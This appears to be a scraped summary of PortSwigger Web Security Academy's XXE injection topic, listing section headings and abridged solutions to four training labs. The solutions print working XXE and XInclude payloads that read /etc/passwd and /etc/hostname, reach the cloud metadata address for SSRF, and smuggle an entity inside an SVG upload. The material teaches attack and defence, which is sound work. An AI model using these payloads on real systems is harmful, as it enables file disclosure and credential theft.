# PortSwigger WSA — XXE Injection
Source: https://portswigger.net/web-security/xxe

## Technique headings
- XML external entity (XXE) injection
- What is XML external entity injection?
- Labs
- How do XXE vulnerabilities arise?
- Read more
- What are the types of XXE attacks?
- Exploiting XXE to retrieve files
- Note
- Exploiting XXE to perform SSRF attacks
- Blind XXE vulnerabilities
- Finding hidden attack surface for XXE injection
- XInclude attacks
- XXE attacks via file upload
- XXE attacks via modified content type
- How to find and test for XXE vulnerabilities
- How to prevent XXE vulnerabilities
- Find XSS vulnerabilities using Burp Suite

## Sub-topic pages
- https://portswigger.net/web-security/xxe/blind
- https://portswigger.net/web-security/xxe/xml-entities


## Labs (2026-10-18 — per-lab scenarios & solutions), 4 lab)

- **Exploiting XXE to perform SSRF attacks** (`lab-exploiting-xxe-to-perform-ssrf`)
  - Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite. Insert the following external entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]> Replace the productId number with a reference to the external entity: &xxe; . The response should contain "Invalid product ID:" followed by the res
- **Exploiting XXE using external entities to retrieve files** (`lab-exploiting-xxe-to-retrieve-files`)
  - Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite. Insert the following external entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> Replace the productId number with a reference to the external entity: &xxe; . The response should contain "Invalid product ID:" followed by the contents
- **Exploiting XInclude to retrieve files** (`lab-xinclude-attack`)
  - Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite. Set the value of the productId parameter to: <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
- **Exploiting XXE via image file upload** (`lab-xxe-via-file-upload`)
  - Create a local SVG image with the following content: <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg> Post a comment on a blog post, and upload this image as an avatar. When you view your 
